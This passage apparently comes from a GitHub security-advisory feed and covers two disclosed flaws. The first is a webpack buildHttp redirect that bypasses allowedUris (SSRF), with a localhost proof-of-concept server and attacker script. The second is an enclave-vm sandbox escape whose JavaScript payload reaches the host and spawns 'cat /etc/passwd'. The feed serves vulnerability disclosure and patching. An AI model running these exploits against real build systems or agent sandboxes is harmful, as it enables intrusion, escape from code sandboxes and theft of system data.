<p>In the HTTP scheme resolver, the allow-list check (<code>allowedUris</code>) is performed when metadata/info is created for the original request (via <code>getInfo()</code>), but the content-fetch path follows redirects by resolving the <code>Location</code> URL without re-checking whether the redirected URL is within <code>allowedUris</code>.</p>
<p>Practical consequence: if an “allowed” host/path can return a 302 (or has an open redirect), it can point to an external URL or an internal-only URL (SSRF). The redirected response is consumed as module content, bundled, and can be cached. If the redirect target is attacker-controlled, this can potentially result in attacker-controlled JavaScript being bundled and later executed when the resulting bundle runs.</p>
<p><strong>Figure 1 (evidence screenshot):</strong> left pane shows the allowed host issuing a 302 redirect to <code>http://127.0.0.1:9100/secret.js</code>; right pane shows the build output confirming allow-list bypass and that the secret appears in the bundle and buildHttp cache.</p>
<img src="https://github.com/user-attachments/assets/bb25f3ff-1919-49f9-951b-ad50bf0c7524" alt="image" height="461" width="1648">


<h3 id="poc">PoC</h3>
<p>This PoC is intentionally constrained to <strong>127.0.0.1</strong> (localhost-only “internal service”) to demonstrate SSRF behavior safely.</p>
<h4 id="1-setup">1) Setup</h4>
<pre><code class="language-bash">mkdir split-ssrf-poc &amp;&amp; cd split-ssrf-poc
npm init -y
npm i -D webpack webpack-cli
</code></pre>
<h4 id="2-create-serverjs">2) Create server.js</h4>
<pre><code class="language-js">#!/usr/bin/env node
"use strict";

const http = require("http");
const url = require("url");

const allowedPort = 9000;
const internalPort = 9100;

const internalUrlDefault = `http://127.0.0.1:${internalPort}/secret.js`;
const secret = `INTERNAL_ONLY_SECRET_${Math.random().toString(16).slice(2)}`;
const internalPayload =
  `export const secret = ${JSON.stringify(secret)};\n` +
  `export default "ok";\n`;

function start(port, handler) {
  return new Promise(resolve =&gt; {
    const s = http.createServer(handler);
    s.listen(port, "127.0.0.1", () =&gt; resolve(s));
  });
}

(async () =&gt; {
  // Internal-only service (SSRF target)
  await start(internalPort, (req, res) =&gt; {
    if (req.url === "/secret.js") {
      res.statusCode = 200;
      res.setHeader("Content-Type", "application/javascript; charset=utf-8");
      res.end(internalPayload);
      console.log(`[internal] 200 /secret.js served (secret=${secret})`);
      return;
    }
    res.statusCode = 404;
    res.end("not found");
  });

  // Allowed host (redirector)
  await start(allowedPort, (req, res) =&gt; {
    const parsed = url.parse(req.url, true);

    if (parsed.pathname === "/redirect.js") {
      const to = parsed.query.to || internalUrlDefault;

      // Safety guard: only allow redirecting to localhost internal service in this PoC
      if (!to.startsWith(`http://127.0.0.1:${internalPort}/`)) {
        res.statusCode = 400;
        res.end("to must be internal-only in this PoC");
        console.log(`[allowed] blocked redirect to: ${to}`);
        return;
      }

      res.statusCode = 302;
      res.setHeader("Location", to);
      res.end("redirecting");
      console.log(`[allowed] 302 /redirect.js -&gt; ${to}`);
      return;
    }

    res.statusCode = 404;
    res.end("not found");
  });

  console.log(`\nServer running:`);
  console.log(`- allowed host:  http://127.0.0.1:${allowedPort}/redirect.js`);
  console.log(`- internal-only: http://127.0.0.1:${internalPort}/secret.js`);
})();
</code></pre>
<h4 id="3-create-attackerjs">3) Create attacker.js</h4>
<pre><code class="language-js">#!/usr/bin/env node
"use strict";

const path = require("path");
const os = require("os");
const fs = require("fs/promises");
const webpack = require("webpack");
const webpackPkg = require("webpack/package.json");

const allowedPort = 9000;
const internalPort = 9100;

const allowedBase = `http://127.0.0.1:${allowedPort}/`;
const internalTarget = `http://127.0.0.1:${internalPort}/secret.js`;
const entryUrl = `${allowedBase}redirect.js?to=${encodeURIComponent(internalTarget)}`;

async function walk(dir) {
  const out = [];
  const items = await fs.readdir(dir, { withFileTypes: true });
  for (const it of items) {
    const p = path.join(dir, it.name);
    if (it.isDirectory()) out.push(...await walk(p));
    else if (it.isFile()) out.push(p);
  }
  return out;
}

async function fileContains(f, needle) {
  try {
    const buf = await fs.readFile(f);
    return buf.toString("utf8").includes(needle) || buf.toString("latin1").includes(needle);
  } catch {
    return false;
  }
}

async function findInFiles(files, needle) {
  const hits = [];
  for (const f of files) if (await fileContains(f, needle)) hits.push(f);
  return hits;
}

const fmtBool = b =&gt; (b ? "✅" : "❌");

(async () =&gt; {
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), "webpack-attacker-"));
  const srcDir = path.join(tmp, "src");
  const distDir = path.join(tmp, "dist");
  const cacheDir = path.join(tmp, ".buildHttp-cache");
  const lockfile = path.join(tmp, "webpack.lock");
  const bundlePath = path.join(distDir, "bundle.js");

  await fs.mkdir(srcDir, { recursive: true });
  await fs.mkdir(distDir, { recursive: true });

  await fs.writeFile(
    path.join(srcDir, "index.js"),
    `import { secret } from ${JSON.stringify(entryUrl)};
console.log("LEAKED_SECRET:", secret);
export default secret;
`
  );

  const config = {
    context: tmp,
    mode: "development",
    entry: "./src/index.js",
    output: { path: distDir, filename: "bundle.js" },
    experiments: {
      buildHttp: {
        allowedUris: [allowedBase],
        cacheLocation: cacheDir,
        lockfileLocation: lockfile,
        upgrade: true
      }
    }
  };

  const compiler = webpack(config);

  compiler.run(async (err, stats) =&gt; {
    try {
      if (err) throw err;

      const info = stats.toJson({ all: false, errors: true, warnings: true });
      if (stats.hasErrors()) {
        console.error(info.errors);
        process.exitCode = 1;
        return;
      }

      const bundle = await fs.readFile(bundlePath, "utf8");
      const m = bundle.match(/INTERNAL_ONLY_SECRET_[0-9a-f]+/i);
      const secret = m ? m[0] : null;

      console.log("\n[ATTACKER RESULT]");
      console.log(`- webpack version: ${webpackPkg.version}`);
      console.log(`- node version: ${process.version}`);
      console.log(`- allowedUris: ${JSON.stringify([allowedBase])}`);
      console.log(`- imported URL (allowed only): ${entryUrl}`);
      console.log(`- temp dir: ${tmp}`);
      console.log(`- lockfile: ${lockfile}`);
      console.log(`- cacheDir: ${cacheDir}`);
      console.log(`- bundle:   ${bundlePath}`);

      if (!secret) {
        console.log("\n[SECURITY SUMMARY]");
        console.log(`- bundle contains internal secret marker: ${fmtBool(false)}`);
        return;
      }

      const lockHit = await fileContains(lockfile, secret);

      let cacheFiles = [];
      try { cacheFiles = await walk(cacheDir); } catch { cacheFiles = []; }
      const cacheHit = cacheFiles.length ? (await findInFiles(cacheFiles, secret)).length &gt; 0 : false;

      const allTmpFiles = await walk(tmp);
      const allHits = await findInFiles(allTmpFiles, secret);

      console.log(`\n- extracted secret marker from bundle: ${secret}`);

      console.log("\n[SECURITY SUMMARY]");
      console.log(`- Redirect allow-list bypass: ${fmtBool(true)} (imported allowed URL, but internal target was fetched)`);
      console.log(`- Internal target (SSRF-like): ${internalTarget}`);
      console.log(`- EXPECTED: internal target should be BLOCKED by allowedUris`);
      console.log(`- ACTUAL: internal content treated as module and bundled`);

      console.log("\n[EVIDENCE CHECKLIST]");
      console.log(`- bundle contains secret:   ${fmtBool(true)}`);
      console.log(`- cache contains secret:    ${fmtBool(cacheHit)}`);
      console.log(`- lockfile contains secret: ${fmtBool(lockHit)}`);

      console.log("\n[PERSISTENCE CHECK] files containing secret");
      for (const f of allHits.slice(0, 30)) console.log(`- ${f}`);
      if (allHits.length &gt; 30) console.log(`- ... and ${allHits.length - 30} more`);
    } catch (e) {
      console.error(e);
      process.exitCode = 1;
    } finally {
      compiler.close(() =&gt; {});
    }
  });
})();
</code></pre>
<h4 id="4-run">4) Run</h4>
<p>Terminal A:</p>
<pre><code class="language-bash">node server.js
</code></pre>
<p>Terminal B:</p>
<pre><code class="language-bash">node attacker.js
</code></pre>
<h4 id="5-expected">5) Expected</h4>
<p>Expected: Redirect target should be rejected if not in allowedUris (only <a href="http://127.0.0.1:9000/">http://127.0.0.1:9000/</a> is allowed).</p>
<h3 id="impact">Impact</h3>
<p>Vulnerability class: Policy/allow-list bypass leading to SSRF behavior at build time and untrusted content inclusion in build outputs (and potentially bundling of attacker-controlled JavaScript if the redirect target is attacker-controlled).</p>
<p>Who is impacted: Projects that enable experiments.buildHttp and rely on allowedUris as a security boundary (to restrict remote module fetching). In such environments, an attacker who can influence imported URLs (e.g., via source contribution, dependency manipulation, or configuration) and can cause an allowed endpoint to redirect can:</p>
<p>trigger network requests from the build machine to internal-only services (SSRF behavior),</p>
<p>cause content from outside the allow-list to be bundled into build outputs,</p>
<p>and cause fetched responses to persist in build artifacts (e.g., buildHttp cache), increasing the risk of later exfiltration.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/webpack/webpack/security/advisories/GHSA-38r7-794h-5758">https://github.com/webpack/webpack/security/advisories/GHSA-38r7-794h-5758</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-68157">https://nvd.nist.gov/vuln/detail/CVE-2025-68157</a></li>
<li><a href="https://github.com/advisories/GHSA-38r7-794h-5758">https://github.com/advisories/GHSA-38r7-794h-5758</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-38r7-794h-5758</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-02-05T18:35:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@enclave-vm/core] Sandbox escape via infinite recursion and error objects]]></title>
        <id>https://github.com/advisories/GHSA-x39w-8vm5-5m3p</id>
        <link href="https://github.com/advisories/GHSA-x39w-8vm5-5m3p"/>
        <updated>2026-02-07T00:31:47.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Note:</strong> The npm package has moved to <code>@enclave-vm/core</code> (formerly <code>enclave-vm</code>).<br>All fixed versions and guidance refer to <code>@enclave-vm/core</code>.</p>
<h3 id="summary">Summary</h3>
<p>The existing layers of security in enclave-vm are insufficient: The AST sanitization can be bypassed with dynamic property accesses, the hardening of the error objects does not cover the peculiar behavior or the vm module and the function constructor access prevention can be side-stepped by leveraging host object references.</p>
<h3 id="details">Details</h3>
<p>There is a bug in Node.js (<a href="https://www.staicu.org/publications/usenixSec2023-SandDriller.pdf">https://www.staicu.org/publications/usenixSec2023-SandDriller.pdf</a>) that makes the vm module leak host references inside the vm module in case of infinite recursion. An attacker can exploit these to escape the sandbox.</p>
<h3 id="poc">PoC</h3>
<p>The following on was tested on Node.js v24.12.0 and enclave-vm 2.7.0.</p>
<pre><code class="language-js">import { Enclave } from 'enclave-vm';

// Create enclave with a tool handler
const enclave = new Enclave({
  timeout: 5000,
  maxToolCalls: 10,
  maxIterations: 1000,
  toolHandler: async (toolName, args) =&gt; {
    // Your tool execution logic
    return { success: true, data: `Called ${toolName}` };
  },
});

// Execute AgentScript code
const result = await enclave.run(`
let res = null, rootProt = null;
let a = () =&gt;{
try {
  a();
} catch (e) {
  rootProt = e[["__proto__"]][["__proto__"]][["__proto__"]];
  res=e.stack
}
}
a();
rootProt[["foo"]] = rootProt[["toString"]][["constructor"]]  
rootProt[["foo"]]("let options = {file: 'cat', args: [null,'/etc/passwd'], envPairs: [], stdio: [{ type: 'pipe', readable: true, writable: false },{ type: 'pipe', readable: false, writable: true },{ type: 'pipe', readable: false, writable: true } ]}; console.log(process.binding('spawn_sync').spawn(options).output[1].toString())")();
`);
</code></pre>
<h3 id="impact">Impact</h3>
<p>Sandbox escape and potential other escalations on FrontMCP/AgentFront/other Frontegg products.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/agentfront/enclave/security/advisories/GHSA-x39w-8vm5-5m3p">https://github.com/agentfront/enclave/security/advisories/GHSA-x39w-8vm5-5m3p</a></li>
<li><a href="https://github.com/agentfront/enclave/commit/2fcf5da81e7e2578ede6f94cae4f379165426dca">https://github.com/agentfront/enclave/commit/2fcf5da81e7e2578ede6f94cae4f379165426dca</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25533">https://nvd.nist.gov/vuln/detail/CVE-2026-25533</a></li>
<li><a href="https://www.staicu.org/publications/usenixSec2023-SandDriller.pdf">https://www.staicu.org/publications/usenixSec2023-SandDriller.pdf</a></li>
<li><a href="https://github.com/advisories/GHSA-x39w-8vm5-5m3p">https://github.com/advisories/GHSA-x39w-8vm5-5m3p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x39w-8vm5-5m3p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-02-05T17:49:35.000Z</published>
    </entry>
</feed>